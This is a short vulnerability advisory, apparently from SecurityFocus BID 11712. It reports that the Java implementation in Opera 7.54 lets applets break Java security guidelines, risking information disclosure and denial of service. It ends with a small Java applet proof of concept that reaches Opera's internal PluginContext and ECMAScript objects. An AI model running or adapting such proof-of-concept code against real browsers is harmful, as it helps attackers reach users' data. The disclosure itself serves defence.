source: http://www.securityfocus.com/bid/11712/info
 
Multiple remote vulnerabilities reportedly affect the Opera Web Browser Java implementation. These issues are due to the insecure proprietary design of the Web browser's Java implementation.
 
These issues may allow an attacker to craft a Java applet that violate Sun's Java secure programming guidelines.
 
These issues may be leveraged to carry out a variety of unspecified attacks including sensitive information disclosure and denial of service attacks. Any successful exploitation would take place with the privileges of the user running the affected browser application.
 
Although only version 7.54 is reportedly vulnerable, it is likely that earlier versions are vulnerable to these issues as well.

import netscape.javascript.*;
import com.opera.*;

public class Opera754EcmaScriptApplet extends java.applet.Applet{

	public void start()? {
		PluginContext pc = (PluginContext)this.getAppletContext();

		int jswin= pc.getJSWindow();
		int esrun= pc.getESRuntime();
		EcmaScriptObject eso4 = EcmaScriptObject.getObject (jswin,1);
		try {
			JSObject js = JSObject.getWindow(this);
			System.out.println(js);
		}
		catch (Exception e) {
		e.printStackTrace();
		}
	}
}